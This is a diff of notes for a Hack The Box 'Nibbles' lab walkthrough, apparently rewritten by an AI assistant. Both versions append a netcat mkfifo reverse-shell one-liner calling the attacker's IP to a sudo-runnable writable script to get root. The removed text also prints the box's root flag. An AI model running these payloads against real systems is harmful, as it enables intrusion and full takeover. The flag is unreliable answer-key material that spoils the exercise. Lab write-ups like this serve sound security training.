@@ -1,104 +1,142 @@
-### Overview
-- Now that we have a reverse shell connection, it is time to escalate privileges. 
-- Unzip the `personal.zip` file and see a file called `monitor.sh`.
-```shell-session
-nibbler@Nibbles:/home/nibbler$ unzip personal.zip
+### Walkthrough: Privilege Escalation on HTB Box Nibbles
 
-unzip personal.zip
-Archive:  personal.zip
-   creating: personal/
-   creating: personal/stuff/
-  inflating: personal/stuff/monitor.sh 
-```
-- The shell script `monitor.sh` is a monitoring script, and it is owned by our `nibbler` user.
-- It is also shown to be writeable as well.
-```shell-session
-nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh
+---
 
-cat monitor.sh
-                 ####################################################################################################
+#### **1. Extracting and Analyzing `personal.zip`**
 
-                 #                                        Tecmint_monitor.sh                                        #
+- **Command**:
+    
+    ```bash
+    unzip personal.zip
+    ```
+    
+- **Contents**:
+    - A directory structure: `personal/stuff/monitor.sh`.
+    - **`monitor.sh` Analysis**:
+        - A monitoring script owned by `nibbler`.
+        - Script is **world-writable**.
 
-                 # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
+---
 
-                 # If any bug, report us in the link below                                                          #
+#### **2. Enumerating for Privilege Escalation**
 
-                 # Free to use/edit/distribute the code below by                                                    #
+- **Tool**: LinEnum.sh
+    
+    - Download LinEnum:
+        
+        ```bash
+        wget http://<your-attack-ip>:8080/LinEnum.sh
+        ```
+        
+    - Make executable:
+        
+        ```bash
+        chmod +x LinEnum.sh
+        ```
+        
+    - Execute:
+        
+        ```bash
+        ./LinEnum.sh
+        ```
+        
+- **Key Findings**:
+    
+    - **Sudo Privileges**:
+        
+        ```plaintext
+        User nibbler may run the following commands on Nibbles:
+            (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+        ```
+        
+    - `nibbler` can execute `monitor.sh` as root without a password.
 
-                 # giving proper credit to Tecmint.com and Author                                                   #
+---
 
-                 #                                                                                                  #
+#### **3. Crafting a Privilege Escalation Payload**
 
-                 ####################################################################################################
+- **Plan**:
+    
+    - Append a reverse shell payload to `monitor.sh`.
+    - Execute the script with `sudo`.
+    - Catch the root shell on the attacker's listener.
+- **Payload**:
+    
+    ```bash
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your-attack-ip> 8443 >/tmp/f
+    ```
+    
+    - Replace `<your-attack-ip>` with your attacking machine's IP.
+- **Append Payload to `monitor.sh`**:
+    
+    ```bash
+    echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a /home/nibbler/personal/stuff/monitor.sh
+    ```
+    
 
-#! /bin/bash
+---
 
-# unset any variable which system may be using
+#### **4. Executing the Script with Sudo**
 
-# clear the screen
+- **Command**:
+    
+    ```bash
+    sudo /home/nibbler/personal/stuff/monitor.sh
+    ```
+    
 
-clear
+---
 
-unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage
+#### **5. Catching the Root Shell**
 
-while getopts iv name
-do
-       case $name in
-         i)iopt=1;;
-         v)vopt=1;;
-         *)echo "Invalid arg";;
-       esac
-done
+- **Set Up Listener**:
+    
+    ```bash
+    nc -lvnp 8443
+    ```
+    
+- **Listener Output**:
+    
+    ```plaintext
+    listening on [any] 8443 ...
+    connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 47488
+    # id
+    uid=0(root) gid=0(root) groups=0(root)
+    ```
+    
 
- <SNIP>
-```
-- Let pull up [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) to perform some automated privilege escalation checks. 
-- First, download the script to your local attack VM or the Pwnbox.
-- Next, start a `Python` HTTP server using the command `sudo python3 -m http.server 8080`.
-```shell-session
-secmancer@htb[/htb]$ sudo python3 -m http.server 8080
-[sudo] password for ben: ***********
+---
 
-Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
-10.129.42.190 - - [17/Dec/2020 02:16:51] "GET /LinEnum.sh HTTP/1.1" 200 -
-```
-- Back on the target type `wget http://<your ip>:8080/LinEnum.sh` to download the script. 
-- If successful, we will see a 200 success response on our Python HTTP server. 
-- Once the script is pulled over, type `chmod +x LinEnum.sh` to make the script executable.
-- Type `./LinEnum.sh` to run it. 
-- We see a ton of interesting output but what immediately catches the eye are `sudo` privileges.
-```shell-session
-[+] We can sudo without supplying a password!
-Matching Defaults entries for nibbler on Nibbles:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+#### **6. Capturing the Root Flag**
 
-User nibbler may run the following commands on Nibbles:
-    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+- **Navigate to `/root`**:
+    
+    ```bash
+    cd /root
+    ```
+    
+- **View `root.txt`**:
+    
+    ```bash
+    cat root.txt
+    ```
+    
 
+---
 
-[+] Possible sudo pwnage!
-/home/nibbler/personal/stuff/monitor.sh
-```
-- The `nibbler` user can run the file `/home/nibbler/personal/stuff/monitor.sh` with root privileges. 
-- Being that we have full control over that file, if we append a reverse shell one-liner to the end of it and execute with `sudo` we should get a reverse shell back as the root user. 
-- Let us edit the `monitor.sh` file to append a reverse shell one-liner.
-```shell-session
-nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh
-```
-- Finally, catch the root shell on our waiting `nc` listener.
-```shell-session
-secmancer@htb[/htb]$ nc -lvnp 8443
+### **Key Takeaways**
 
-listening on [any] 8443 ...
-connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 47488
-# id
+1. **Privilege Escalation Lessons**:
+    
+    - Identify writable files with elevated privileges.
+    - Modify scripts cautiously by appending payloads to avoid breaking functionality.
+2. **Post-Exploitation Tasks**:
+    
+    - Always take detailed notes.
+    - Explore alternate methods to achieve similar results for practice.
+3. **Replication**:
+    
+    - Attempt the box again to reinforce understanding.
+    - Explore different tools for enumeration, exploitation, and privilege escalation.
 
-uid=0(root) gid=0(root) groups=0(root)
-```
-- From here, we can grab the `root.txt` flag. 
-- Congrats, we solved our first box on HTB!
-
-### Questions
-- Escalate privileges and submit the root.txt flag.
-	- de5e5d6619862a8aa5b9b212314e0cdd
+Congratulations on completing the box! Let me know if you'd like to explore more boxes or learn about advanced techniques.
